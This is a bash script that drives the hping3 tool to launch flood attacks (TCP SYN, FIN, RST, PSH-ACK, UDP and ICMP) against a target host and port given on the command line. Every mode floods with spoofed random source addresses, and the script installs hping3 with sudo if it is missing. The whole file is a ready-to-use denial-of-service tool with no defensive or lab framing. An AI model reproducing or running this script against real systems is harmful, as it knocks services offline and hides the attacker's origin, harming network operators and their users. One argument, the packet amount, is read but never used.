#!/bin/bash

if [ "$#" -ne 4 ];then
    echo "Usage: ./hping3_flood.sh <mode> <target> <port> <packet amount>";
    exit 0
fi

MODE=$1
TARGET=$2
PORT=$3
PACKET_AMOUNT=$4

if ! which hping3 &> /dev/null
then
    echo "hping3 is not installed. Installing now..."
    sudo apt install hping3
fi

case $MODE in
    "syn")
        echo "Starting TCP SYN Flood attack"
        echo "Enter packet size: "
        read size
        echo "Enter window size: "
        read window
        sudo hping3 -S -p $PORT -d $size -w $window --flood --faster --rand-source $TARGET
        ;;

    "fin")
        echo "Starting TCP FIN Flood attack"
        sudo hping3 --flood --rand-source -F -p $PORT $TARGET
        ;;

    "rst")
        echo "Starting TCP RST Flood attack"
        sudo hping3 --flood --rand-source -R -p $PORT $TARGET
        ;;

    "pshack")
        echo "Starting TCP PUSH ACK Flood attack"
        sudo hping3 --flood --rand-source -PA -p $PORT $TARGET
        ;;

    "udp")
        echo "Starting UDP Flood attack"
        sudo hping3 --flood --rand-source --udp -p $PORT $TARGET
        ;;

    "icmp")
        echo "Starting ICMP Flood attack"
        sudo hping3 --flood --rand-source -1 -p $PORT $TARGET
        ;;    
esac